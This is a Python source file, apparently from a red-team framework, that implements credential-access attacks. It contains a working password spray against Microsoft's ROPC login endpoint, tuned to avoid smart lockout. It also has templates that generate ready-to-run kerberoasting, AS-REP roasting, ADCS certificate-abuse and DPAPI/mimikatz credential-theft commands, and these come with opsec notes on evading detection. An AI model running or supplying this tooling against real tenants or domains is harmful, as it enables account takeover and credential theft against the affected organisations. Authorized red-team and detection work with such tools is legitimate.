# language: Python 3.11+, file: cf/creds.py
# *credential access — ropc spray, kerberoast/adcs/dpapi generators*
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from .http import get_client
from .util import json_dumps

TOKEN_URL = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"


class CredsError(RuntimeError):
    """Spray stopped early or generator asked for unknown technique."""


@dataclass(slots=True)
class SprayResult:
    upn: str
    outcome: str
    status: int = 0


@dataclass(slots=True)
class SprayReport:
    results: list[SprayResult] = field(default_factory=list)
    stopped: str = ""

    def by_outcome(self) -> dict[str, int]:
        counts: dict[str, int] = {}
        for r in self.results:
            counts[r.outcome] = counts.get(r.outcome, 0) + 1
        return counts

    def hits(self) -> list[str]:
        return [r.upn for r in self.results if r.outcome == "success"]


async def spray_o365(
    upns: list[str],
    password: str,
    *,
    tenant: str = "common",
    delay: float = 30.0,
    max_attempts: int = 0,
) -> SprayReport:
    """T1110.003 — password spray against the ROPC endpoint.

    Stops the whole run on smart-lockout so the operator never burns the
    accounts they are about to use. delay is seconds between attempts.
    """
    from .access import classify
    from .http import Rate

    if not upns:
        raise CredsError("no upns to spray")
    if not password:
        raise CredsError("empty password")

    client = get_client()
    report = SprayReport()
    # pacing lives in the Rate limiter (one attempt per delay window)
    rate = Rate(limit=1, period=max(delay, 1.0))
    for i, upn in enumerate(upns):
        if max_attempts and i >= max_attempts:
            report.stopped = "max_attempts"
            break
        res: dict[str, Any]
        try:
            res = await client.post(
                TOKEN_URL.format(tenant=tenant or "common"),
                data={
                    "grant_type": "password",
                    "client_id": "1950a258-227b-4e31-a9cf-717495945fc2",
                    "scope": "openid",
                    "username": upn,
                    "password": password,
                },
                expect_json=True,
                retries=0,
                rate=rate,
                rate_key=f"spray:{tenant}",
            )
        except Exception as exc:  # transport-level failure — HTTPClient returns
            # envelopes for HTTP errors but malformed input raises synchronously
            res = {"status": 0, "body": None, "error": str(exc)}
        body = res.get("body")
        status = int(res.get("status") or 0)
        if status == 200 and isinstance(body, dict) and "access_token" in body:
            outcome = "success"
        else:
            outcome = classify(body) if isinstance(body, dict) else "transport_error"
        report.results.append(SprayResult(upn=upn, outcome=outcome, status=status))
        if outcome == "smart_lockout":
            report.stopped = "smart_lockout"
            break
        if outcome == "transport_error":
            report.stopped = "transport"
            break
    return report


GEN: dict[str, dict[str, str]] = {
    "kerberoast": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Add-Type -AssemblyName System.IdentityModel;"
            "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken "
            "-ArgumentList 'HTTP/{target}'\""
        ),
        "alt": "rubeus.exe kerberoast /domain:{domain} /nowrap",
        "mitre": "T1558.003",
        "telemetry": "4769, 4624, sysmon:1",
        "opsec": "roasting outside change windows; 4769 storms are the classic detection",
    },
    "asrep": {
        "command": "impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass",
        "alt": "rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
        "mitre": "T1558.004",
        "telemetry": "4768",
        "opsec": "only works against accounts with pre-auth disabled — enumerate first",
    },
    "adcs": {
        "command": (
            "certipy.exe find -u {user}@{domain} -p {pass} -stdout | "
            "certipy req -u {user}@{domain} -p {pass} -ca '{ca}' -template {template}"
        ),
        "alt": "certify.exe request /ca:{domain}\\{ca} /template:{template}",
        "mitre": "T1649",
        "telemetry": "5136, 5137, 805, sysmon:1",
        "opsec": "ESC1 leaves a certificate request in AD — clean or attribute it",
    },
    "dpapi": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "[Security.Cryptography.ProtectedData]::Unprotect("
            "(Get-Content cred.blob -Encoding Byte), $null, "
            "'CurrentUser') | ForEach-Object { [Text.Encoding]::UTF8.GetString($_) }\""
        ),
        "alt": "mimikatz.exe \"dpapi::cred /in:%appdata%\\Microsoft\\Credentials\\*\" exit",
        "mitre": "T1555.004",
        "telemetry": "sysmon:1, 4688",
        "opsec": "user-context only; reads the machinekey from the user profile",
    },
}


def generator(kind: str, **values: str) -> dict[str, str]:
    spec = GEN.get(kind)
    if spec is None:
        raise CredsError(f"unknown creds technique: {kind}")
    try:
        out = {k: v.format(**values) for k, v in spec.items()}
    except (KeyError, IndexError) as exc:
        # a spec template referenced a value the caller did not pass
        raise CredsError(f"{kind}: missing value {exc}") from None
    out["kind"] = kind
    out["json"] = json_dumps(out)
    return out
